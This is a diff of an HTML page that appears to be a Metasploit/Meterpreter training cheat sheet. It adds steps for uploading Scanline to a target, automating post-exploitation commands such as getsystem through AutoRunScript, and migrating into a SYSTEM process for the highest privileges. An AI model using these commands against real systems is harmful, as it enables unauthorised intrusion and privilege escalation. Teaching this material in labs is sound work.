@@ -410,7 +410,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
     </div>
 
      <div class="setup-block">
-          <div class="setup-title">📡 Scanline</div>
+          <div class="setup-title">📡 Scanline </div>
           <div class="setup-body">
             <div class="setup-step">
               <div class="step-num">1</div>
@@ -424,6 +424,35 @@ setg Proxies socks5:127.0.0.1:9050</div>
               <div class="step-body">
                 <div class="step-text">Move sl.exe to your current directory to simplify the meterpreter upload command</div>
                 <div class="step-cmd">mv &lt;filepath to sl.exe&gt; .
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  <div class="setup-block">
+          <div class="setup-title">⚙️ Automate Meterpreter Sessions (Optional)</div>
+          <div class="setup-body">
+            <div class="setup-step">
+              <div class="step-num">1</div>
+              <div class="step-body">
+                <div class="step-text"> Create a file on your attack platform and give it full permissions </div>
+                <div class="step-cmd"> touch &lt;filename&gt; <br> chmod 777 &lt;filename&gt; </div>
+              </div>
+            </div>
+             <div class="setup-step">
+              <div class="step-num">2</div>
+              <div class="step-body">
+                <div class="step-text">Identify the meterpreter commands you'd like to run when a session is established and add to them to the newly created file each on a separate line (Common ones are in the example provided below)</div>
+                <div class="step-cmd"> getsystem <br> sysinfo <br> getuid <br> getpid <br> ipconfig <br> netstat <br> </div>
+              </div>
+            </div>
+              <div class="setup-step">
+                <div class="step-num">3</div>
+              <  div class="step-body">
+                  <div class="step-text">Open msfconsole and run the following command:</div>
+                  <div class="step-cmd">&lt;set&gt; or &lt;setg&gt; AutoRunScript &lt;path to file you created&gt;</div>
               </div>
             </div>
           </div>
@@ -602,13 +631,12 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">upload</td><td class="c2">Push a file to target (e.g. scanline)</td><td class="c3"> meterpreter &gt; upload sl.exe C:\Windows\Temp\</td></tr>
           <tr><td class="c1">search</td><td class="c2">Search for a file (can also limit yourself to a specific directory)</td><td class="c3">meterpreter &gt; search -d "C:\\Documents and Settings\\student\\" -f "*.jpg*"</td></tr>
           <tr><td class="c1">migrate</td><td class="c2">Move your active payload from the initial compromised process into a different running process on the target system</td><td class="c3">meterpreter &gt; migrate &lt;PID&gt;  </td></tr>
-            <div class="callout callout-info" style="margin-bottom:0;">
-              <span class="callout-icon">ℹ</span>
-              <div>When migrating, look for a process running as NTAUTHORITY/SYSTEM to gain the highest level of local privileges and ensure stability.</div>
-            </div>
-          
-        </table>
+          <div class="callout callout-info">
+        <span class="callout-icon">ℹ</span>
+        <div>When migrating, look for a process running as NTAUTHORITY/SYSTEM to gain the highest level of local privileges and ensure stability.</div>
       </div>
+    </div>
+            
 
       <div class="divider"></div>
 
